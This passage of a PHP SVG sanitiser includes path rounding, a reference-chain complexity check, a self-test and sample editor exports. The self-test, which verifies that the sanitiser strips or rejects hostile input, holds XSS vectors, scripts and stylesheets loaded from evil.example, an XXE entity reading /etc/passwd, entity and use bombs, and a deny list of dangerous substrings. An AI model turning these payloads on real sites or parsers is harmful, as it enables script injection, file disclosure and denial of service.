                $el->setAttribute($a, $this->num((float) $m[1], $this->dec));
            }
        }
        foreach (['transform', 'gradientTransform', 'patternTransform', 'viewBox'] as $a) {
            if ($el->hasAttribute($a)) $el->setAttribute($a, trim((string) preg_replace('~\s+~', ' ', $el->getAttribute($a))));
        }
    }

    /** Pfaddaten runden – mit echtem Zerleger (Bogen-Flags „01“ sind zwei Werte); bei Unklarheit unverändert */
    private function path(string $d): string
    {
        static $argc = ['m' => 2, 'l' => 2, 'h' => 1, 'v' => 1, 'c' => 6, 's' => 4, 'q' => 4, 't' => 2, 'a' => 7, 'z' => 0];
        $tok = [];
        $cmd = null;
        $k = 0;
        $i = 0;
        $n = strlen($d);
        while ($i < $n) {
            $ch = $d[$i];
            if (ctype_space($ch) || $ch === ',') { $i++; continue; }
            if (ctype_alpha($ch) && $ch !== 'e' && $ch !== 'E') {
                if (!isset($argc[strtolower($ch)])) return $d;
                $cmd = strtolower($ch);
                $tok[] = ['c', $ch];
                $k = 0;
                $i++;
                continue;
            }
            if ($cmd === null || $cmd === 'z') return $d;
            if ($cmd === 'a' && in_array($k % 7, [3, 4], true)) {
                if ($ch !== '0' && $ch !== '1') return $d;
                $tok[] = ['n', $ch];
                $k++;
                $i++;
                continue;
            }
            if (!preg_match('~\G[-+]?(?:\d+\.?\d*|\.\d+)(?:[eE][-+]?\d+)?~', $d, $m, 0, $i)) return $d;
            $tok[] = ['n', $this->num((float) $m[0], $this->dec)];
            $k++;
            $i += strlen($m[0]);
        }
        $out = '';
        $prev = 'c';
        foreach ($tok as [$t, $v]) {
            if ($t === 'n' && $prev === 'n' && $v[0] !== '-') $out .= ' ';
            $out .= $v;
            $prev = $t;
        }
        return $out;
    }

    private function num(float $n, int $dec): string
    {
        $s = number_format(round($n, $dec), $dec, '.', '');
        if (str_contains($s, '.')) $s = rtrim(rtrim($s, '0'), '.');
        return $s === '-0' || $s === '' ? '0' : $s;
    }

    /** Zeichenaufwand inkl. <use>-Wiederholungen begrenzen (verschachtelte use-Ketten als „Bombe“) */
    private function complexity(\DOMDocument $doc): void
    {
        $byId = [];
        $keep = $this->all($doc->documentElement);   // hält die PHP-Objekte der Knoten fest → spl_object_id bleibt eindeutig
        foreach ($keep as $el) {
            if ($el->hasAttribute('id')) $byId[$el->getAttribute('id')] = $el;
        }
        $memo = [];
        $weigh = function (\DOMElement $el, array $stack) use (&$weigh, &$memo, $byId): float {
            $key = spl_object_id($el);
            if (isset($memo[$key])) return $memo[$key];
            if (isset($stack[$key]) || count($stack) > 400) return INF;   // Kreisverweis bzw. zu tiefe Kette
            $stack[$key] = true;
            $w = 1.0;
            foreach ($el->childNodes as $c) {
                if ($c instanceof \DOMElement) $w += $weigh($c, $stack);
                if ($w > self::MAX_RENDER) break;
            }
            if ($el->localName === 'use') {
                $ref = ltrim(trim($el->getAttribute('href') ?: $el->getAttributeNS(self::XLINK, 'href')), '#');
                if (isset($byId[$ref])) $w += $weigh($byId[$ref], $stack);
            }
            return $memo[$key] = $w;
        };
        if ($weigh($doc->documentElement, []) > self::MAX_RENDER) {
            throw new \RuntimeException(__('SVG ist zu komplex (zu viele verschachtelte Wiederholungen).'));
        }
    }

    private function drawsSomething(\DOMElement $root): bool
    {
        foreach ($this->all($root) as $el) {
            if (in_array($el->localName, self::SHAPES, true)) return true;
        }
        return false;
    }

    // ================================================================= Selbsttest (php bin/console svg:selftest)

    /** @return array{ok: int, fails: string[], log: string[]} */
    public static function selftest(?string $dump = null): array
    {
        $ok = 0;
        $fails = [];
        $log = [];
        $t = function (bool $cond, string $label) use (&$ok, &$fails) { $cond ? $ok++ : $fails[] = $label; };
        // Nichts davon darf im Ergebnis stehen (klein geschrieben, Leerraum entfernt)
        $bad = ['<script', 'javascript:', 'vbscript:', 'onload', 'onclick', 'onmouseover', 'onerror', 'onbegin', 'foreignobject',
            '<iframe', '<a', '<animate', '<set', '<image', 'data:', '@import', 'expression(', '-moz-binding', 'behavior', '<!entity',
            '<!doctype', '<?xml-stylesheet', 'evil.example', 'lol', 'xlink:href="h', '<html', '<body'];
        $clean = function (string $svg) use ($bad): array {
            $low = strtolower(preg_replace('~\s+~', '', $svg));
            return array_values(array_filter($bad, fn($b) => str_contains($low, str_replace(' ', '', $b))));
        };
        $hdr = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100">';
        $box = '<rect width="100" height="100" fill="#0a7"/>';
        $bomb = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
            . '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
            . '<!ENTITY lol9 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]>' . $hdr . $box . '<text x="5" y="50">&lol9;</text></svg>';
        $png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
        $useBomb = $hdr . '<defs><path id="a" d="M0 0h1v1z"/>';
        foreach (range(1, 9) as $i) {
            $useBomb .= '<g id="l' . $i . '">' . str_repeat('<use href="#' . ($i === 1 ? 'a' : 'l' . ($i - 1)) . '"/>', 10) . '</g>';
        }
        $useBomb .= '</defs><use href="#l9"/></svg>';

        // [Bezeichnung, SVG, erwartet: 'clean' (bereinigt, ohne Rest) | 'reject' | 'raster' | 'font']
        $evil = [
            ['<script>', $hdr . $box . '<script>alert(1)</script><script xlink:href="https://evil.example/x.js"/></svg>', 'clean'],
            ['onload/onclick', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" onload="alert(1)"><rect width="100" height="100" onclick="alert(2)" ONMOUSEOVER="x()"/></svg>', 'clean'],
            ['javascript:-href', $hdr . $box . '<use href="javascript:alert(1)"/><use xlink:href=" jav&#x09;ascript:alert(1)"/></svg>', 'clean'],
            ['xlink:href extern', $hdr . $box . '<use xlink:href="http://evil.example/sprite.svg#icon"/><linearGradient id="g" xlink:href="https://evil.example/g.svg#x"/></svg>', 'clean'],
            ['<use href="https://…">', $hdr . $box . '<use href="https://evil.example/a.svg#x" x="10"/></svg>', 'clean'],
            ['foreignObject mit HTML', $hdr . $box . '<foreignObject width="100" height="100"><html xmlns="http://www.w3.org/1999/xhtml"><body><iframe src="https://evil.example"></iframe><script>alert(1)</script></body></html></foreignObject></svg>', 'clean'],
            ['<style>@import url(…)', $hdr . '<style>@import url(https://evil.example/x.css);@import "//evil.example/y.css";.a{fill:red}</style><rect class="a" width="100" height="100"/></svg>', 'clean'],
            ['CSS url(http…)', $hdr . '<style>.a{fill:url(https://evil.example/p.svg#g);stroke:red}rect{background:url("http://evil.example/x.png")}</style><rect class="a" width="100" height="100" style="fill:url(http://evil.example/a#b);filter:url(https://evil.example/f.svg#f)"/><circle r="5" fill="url(https://evil.example/g#x)"/></svg>', 'clean'],
            ['CSS expression/behavior/-moz-binding', $hdr . '<style>rect{width:expression(alert(1));behavior:url(x.htc);-moz-binding:url(x.xml#x)}</style>' . $box . '</svg>', 'clean'],
            ['Entity-Bombe (Billion Laughs)', $bomb, 'clean'],
            ['Externe Entity (XXE)', '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' . $hdr . $box . '<text x="1" y="9">&xxe;</text></svg>', 'clean'],
            ['xml-stylesheet-PI', '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="https://evil.example/x.xsl"?>' . $hdr . $box . '<?xml-stylesheet href="https://evil.example/y.css"?></svg>', 'clean'],
            ['image mit data:text/html', $hdr . $box . '<image width="10" height="10" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="/></svg>', 'clean'],
            ['image mit externer Adresse', $hdr . $box . '<image width="10" height="10" xlink:href="https://evil.example/track.png"/></svg>', 'clean'],
            ['<a href="javascript:">', $hdr . '<a href="javascript:alert(1)"><rect width="100" height="100"/></a><a xlink:href="javascript:alert(2)"><circle r="4"/></a></svg>', 'clean'],
            ['<animate attributeName="href">', $hdr . '<a><rect width="100" height="100"/><animate attributeName="href" to="javascript:alert(1)" begin="0s"/></a><use href="#x"><set attributeName="xlink:href" to="javascript:alert(1)"/></use></svg>', 'clean'],
            ['<set attributeName="onmouseover">', $hdr . $box . '<set attributeName="onmouseover" to="alert(1)"/><animateTransform attributeName="transform" type="rotate" onbegin="alert(1)"/></svg>', 'clean'],
            ['verschachteltes <svg> mit Ereignis', $hdr . $box . '<svg onload="alert(1)" x="10" y="10" width="20" height="20"><circle r="5" onmouseover="alert(2)"/><svg><script>alert(3)</script></svg></svg></svg>', 'clean'],
            ['handler/listener (SVG Tiny)', $hdr . $box . '<handler type="application/ecmascript">alert(1)</handler><listener event="click" handler="#h"/></svg>', 'clean'],
            ['iframe/embed/object', $hdr . $box . '<iframe src="https://evil.example"/><embed src="https://evil.example/x.swf"/><object data="https://evil.example/x"/></svg>', 'clean'],
            ['Entity-kodiertes javascript:', $hdr . $box . '<a href="&#106;avascript:alert(1)"><text x="1" y="9" style="fill:url(&#104;ttps://evil.example/a#b)">x</text></a></svg>', 'clean'],
            ['use-Bombe', $useBomb, 'reject'],
            ['Pixelbild data:image/png (Bildschirmfoto)', $hdr . '<image width="100" height="100" xlink:href="data:image/png;base64,' . $png . '"/></svg>', 'raster'],
            ['Pixelbild im CSS', $hdr . '<style>.a{fill:url(data:image/jpeg;base64,/9j/4AAQ)}</style>' . $box . '</svg>', 'raster'],
            ['Eingebettete Schrift', $hdr . '<style>@font-face{font-family:X;src:url(data:font/woff2;base64,d09GMgABAAAA)}</style><text x="1" y="9">A</text></svg>', 'font'],
            ['Übergroße Datei (> 2 MB)', $hdr . $box . '<desc>' . str_repeat('x', self::MAX_BYTES) . '</desc></svg>', 'reject'],
            ['Kein SVG', '<html><body><script>alert(1)</script></body></html>', 'reject'],
            ['Nach Bereinigung leer', $hdr . '<script>alert(1)</script><foreignObject/></svg>', 'reject'],
        ];
        foreach ($evil as [$label, $svg, $expect]) {
            try {
                $r = self::clean($svg);
                $left = $clean($r['svg']);
                $t($expect === 'clean', "$label: erwartet Ablehnung ($expect), wurde angenommen");
                $t(!$left, "$label: Reste im Ergebnis: " . implode(', ', $left));
                $t($expect !== 'clean' || $r['unsafe'] > 0, "$label: nichts als unsicher gezählt");
                $re = @simplexml_load_string($r['svg']);
                $t($re !== false, "$label: Ergebnis ist kein gültiges XML");
                $log[] = sprintf('  %-40s bereinigt (%d unsicher)  %s', $label, $r['unsafe'], mb_strimwidth($r['svg'], 0, 90, '…'));
            } catch (\RuntimeException $e) {
                $msg = $e->getMessage();
                $t($expect !== 'clean', "$label: unerwartet abgelehnt: $msg");
                if ($expect === 'raster') $t(str_contains($msg, 'eingebettete Bilddaten'), "$label: falsche Meldung: $msg");
                if ($expect === 'font') $t(str_contains($msg, 'Schriftdateien'), "$label: falsche Meldung: $msg");
                $log[] = sprintf('  %-40s abgelehnt: %s', $label, $msg);
            }
        }

        // Harmlose Exporte: Inhalt und Aussehen bleiben (Elemente, Farben, Verläufe, Text)
        foreach (self::samples() as $name => [$svg, $must]) {
            try {
                $r = self::clean($svg);
                $low = strtolower($r['svg']);
                foreach ($must as $m) $t(str_contains($low, strtolower($m)), "$name: „{$m}“ fehlt nach dem Bereinigen");
                $t(!$clean($r['svg']), "$name: unerwartete Reste");
                $t($r['out'] < $r['in'], "$name: nicht kleiner geworden ({$r['in']} → {$r['out']})");
                foreach (['inkscape', 'sodipodi', 'illustrator', 'adobe', 'metadata', 'rdf:', 'figma', 'sketch', '<!--'] as $x) {
                    $t(!str_contains($low, $x), "$name: Editor-Daten „{$x}“ nicht entfernt");
                }
                $log[] = sprintf('  %-40s %s, %d×%d', $name, self::note($r), $r['width'], $r['height']);
                if ($dump) {
                    @mkdir($dump, 0775, true);
                    file_put_contents("$dump/$name-vorher.svg", $svg);
                    file_put_contents("$dump/$name-nachher.svg", $r['svg']);
                }
            } catch (\RuntimeException $e) {
                $t(false, "$name: abgelehnt: " . $e->getMessage());
            }
        }

        // Einzelheiten
        $r = self::clean('<svg xmlns="http://www.w3.org/2000/svg" width="120" height="60"><path d="M10.123456 20.987654L30.5 40.25a5 5 0 01.5 5z"/></svg>');
        $t(str_contains($r['svg'], 'viewBox="0 0 120 60"'), 'viewBox aus width/height');
        $t(str_contains($r['svg'], 'd="M10.123 20.988L30.5 40.25a5 5 0 0 1 .5 5z"') || str_contains($r['svg'], 'd="M10.123 20.988L30.5 40.25a5 5 0 0 1 0.5 5z"'), 'Pfad gerundet, Bogen-Flags erhalten: ' . $r['svg']);
        $t($r['width'] === 120 && $r['height'] === 60, 'Maße aus der viewBox');
        $r = self::clean('<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4"/></svg>');
        $t(str_contains($r['svg'], 'xmlns="http://www.w3.org/2000/svg"'), 'xmlns ergänzt (Datei ohne Namensraum)');
        $r = self::clean('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" role="img" aria-labelledby="t"><title id="t">Logo</title><desc>Beschreibung</desc><g><g><rect id="unused" width="1" height="1"/></g></g><defs><linearGradient id="nie"/></defs></svg>');
        $t(str_contains($r['svg'], '<title id="t">Logo</title>') && str_contains($r['svg'], 'aria-labelledby="t"') && str_contains($r['svg'], '<desc>'), 'title/desc/aria bleiben');
        $t(!str_contains($r['svg'], 'unused') && !str_contains($r['svg'], 'nie') && !str_contains($r['svg'], '<g'), 'ungenutzte ids/Definitionen und leere Gruppen entfernt');
        $r = self::clean('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><defs><linearGradient id="a"><stop offset="0" stop-color="red"/></linearGradient><linearGradient id="b" href="#a"/></defs><rect width="10" height="10" fill="url(#b)"/></svg>');
        $t(str_contains($r['svg'], 'id="a"') && str_contains($r['svg'], 'id="b"'), 'Verlaufskette (href) bleibt erhalten');
        return ['ok' => $ok, 'fails' => $fails, 'log' => $log];
    }

    /** Typische Exporte aus Illustrator, Inkscape und Figma: [SVG, Teile, die erhalten bleiben müssen] */
    public static function samples(): array
    {
        $ai = <<<'SVG'
<?xml version="1.0" encoding="utf-8"?>
<!-- Generator: Adobe Illustrator 27.5.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
	<!ENTITY ns_extend "http://ns.adobe.com/Extensibility/1.0/">
	<!ENTITY ns_ai "http://ns.adobe.com/AdobeIllustrator/10.0/">
	<!ENTITY ns_graphs "http://ns.adobe.com/Graphs/1.0/">
	<!ENTITY ns_vars "http://ns.adobe.com/Variables/1.0/">
	<!ENTITY ns_sfw "http://ns.adobe.com/SaveForWeb/1.0/">
	<!ENTITY ns_svg "http://www.w3.org/2000/svg">
	<!ENTITY ns_xlink "http://www.w3.org/1999/xlink">
]>
<svg version="1.1" id="Ebene_1" xmlns:x="&ns_extend;" xmlns:i="&ns_ai;" xmlns:graph="&ns_graphs;"
	 xmlns="&ns_svg;" xmlns:xlink="&ns_xlink;" x="0px" y="0px" viewBox="0 0 240 120"
	 style="enable-background:new 0 0 240 120;" xml:space="preserve">
<style type="text/css">
	.st0{fill:#16201E;}
	.st1{fill:url(#SVGID_1_);}
	.st2{fill:none;stroke:#F6C9A8;stroke-width:4.0000001;stroke-miterlimit:10;}
	.st3{font-family:'Helvetica-Bold';font-size:28px;fill:#FFFFFF;}
</style>
<switch>
	<foreignObject requiredExtensions="&ns_ai;" x="0" y="0" width="1" height="1">
		<i:aipgfRef  xlink:href="#adobe_illustrator_pgf">
		</i:aipgfRef>
	</foreignObject>
	<g i:extraneous="self">
		<rect class="st0" width="240" height="120"/>
		<linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="20.0000019" y1="60.0000038" x2="100.0000076" y2="60.0000038">
			<stop  offset="0" style="stop-color:#F6C9A8"/>
			<stop  offset="1" style="stop-color:#E07A5F"/>
		</linearGradient>
		<circle class="st1" cx="60.0000038" cy="60.0000038" r="40.0000038"/>
		<path class="st2" d="M120.0000076,30.0000019c16.5685425,0,30.0000019,13.4314575,30.0000019,30.0000019
			s-13.4314575,30.0000019-30.0000019,30.0000019"/>
		<text transform="matrix(1 0 0 1 160.2998 69.8003)" class="st3">KX</text>
	</g>
</switch>
<i:pgf  id="adobe_illustrator_pgf">
	<![CDATA[
		eJzsvWuPHMlxKPpdv6J8L7KwBR6nhfF5WnGSq5DXhEKFXJ0M7c9pRAQ5GzgbqRTKHH1KjO
	]]>
</i:pgf>
</svg>
SVG;
        $inkscape = <<<'SVG'
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   width="200mm"
   height="100mm"
   viewBox="0 0 200 100"
   version="1.1"
   id="svg5"
   inkscape:version="1.3 (0e150ed6c4, 2023-07-21)"
   sodipodi:docname="logo.svg"
   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:dc="http://purl.org/dc/elements/1.1/">
  <sodipodi:namedview
     id="namedview7"
     pagecolor="#ffffff"
     bordercolor="#000000"
     inkscape:showpageshadow="2"
     inkscape:document-units="mm"
     inkscape:zoom="0.73"
     inkscape:current-layer="layer1" />
  <defs
     id="defs2">
    <radialGradient
       inkscape:collect="always"
       xlink:href="#linearGradient1"
       id="radialGradient2"
       cx="50.000001"
       cy="50.000002"
       fx="50.000001"
       fy="50.000002"
       r="40.123456"
       gradientUnits="userSpaceOnUse" />
    <linearGradient
       id="linearGradient1"
       inkscape:collect="always">
      <stop
         style="stop-color:#0a84ff;stop-opacity:1;"
         offset="0"
         id="stop1" />
      <stop
         style="stop-color:#32d74b;stop-opacity:1;"
         offset="1"
         id="stop2" />
    </linearGradient>
    <linearGradient id="unbenutzt" inkscape:collect="always"><stop offset="0" style="stop-color:#000"/></linearGradient>
  </defs>
  <metadata id="metadata1"><rdf:RDF><cc:Work rdf:about=""><dc:title>Logo</dc:title></cc:Work></rdf:RDF></metadata>
  <g
     inkscape:label="Ebene 1"
     inkscape:groupmode="layer"
     id="layer1">
    <circle
       style="fill:url(#radialGradient2);fill-opacity:1;stroke:#16201e;stroke-width:2.11666667;stroke-dasharray:none;-inkscape-font-specification:'Sans Bold'"
       id="path1"
       cx="50.000001"
       cy="50.000002"
       r="40.123456" />
    <path
       style="fill:none;stroke:#e07a5f;stroke-width:3.175;stroke-linecap:round"
       d="m 110.12345,80.987654 c 10.00001,-30.000003 30.00001,-30.000003 40.00001,0 a 20.000001,20.000001 0 0 1 20,-20"
       id="path2"
       sodipodi:nodetypes="csa" />
    <text
       xml:space="preserve"
       style="font-size:14.1111px;font-family:sans-serif;font-weight:bold;fill:#16201e"
       x="110.5"
       y="40.25"
       id="text1"><tspan
         sodipodi:role="line"
         id="tspan1"
         x="110.5"
         y="40.25">KLXM</tspan></text>
    <g id="g-leer" inkscape:label="leer"></g>
  </g>
</svg>
SVG;
        $figma = <<<'SVG'
<svg width="160" height="160" viewBox="0 0 160 160" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_12_34)">
<rect width="160" height="160" rx="24" fill="#16201E"/>
<g filter="url(#filter0_d_12_34)">
<path fill-rule="evenodd" clip-rule="evenodd" d="M48.0000 40.0000H72.5000V120.0000H48.0000V40.0000ZM88.7500 40.0000L116.0000 80.0000L88.7500 120.0000H112.0000L139.2500 80.0000L112.0000 40.0000H88.7500Z" fill="url(#paint0_linear_12_34)"/>
</g>
<circle cx="130" cy="30" r="10" fill="#F6C9A8"/>
</g>
<defs>
<filter id="filter0_d_12_34" x="40" y="36" width="107.25" height="96" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
<feFlood flood-opacity="0" result="BackgroundImageFix"/>
<feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"/>
<feOffset dy="4"/>
<feGaussianBlur stdDeviation="4"/>
<feComposite in2="hardAlpha" operator="out"/>
<feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.25 0"/>
<feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_12_34"/>
<feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_12_34" result="shape"/>
</filter>
<linearGradient id="paint0_linear_12_34" x1="48" y1="40" x2="139.25" y2="120" gradientUnits="userSpaceOnUse">
<stop stop-color="#F6C9A8"/>
<stop offset="1" stop-color="#E07A5F"/>
</linearGradient>
<clipPath id="clip0_12_34">
<rect width="160" height="160" fill="white"/>
</clipPath>
</defs>
</svg>
SVG;
        return [
            'illustrator' => [$ai, ['<switch>', 'url(#svgid_1_)', '.st0{fill:#16201e}', '<text', 'kx', '<lineargradient', 'viewbox="0 0 240 120"']],
            'inkscape' => [$inkscape, ['url(#radialgradient2)', 'xlink:href="#lineargradient1"', '<tspan', 'klxm', 'stroke-dasharray:none', 'a20 20 0 0 1 20-20', 'width="200mm"']],
            'figma' => [$figma, ['filter="url(#filter0_d_12_34)"', 'clip-path="url(#clip0_12_34)"', '<fegaussianblur', 'fill-rule="evenodd"', 'm48 40h72.5v120h48v40z']],
        ];
    }
}
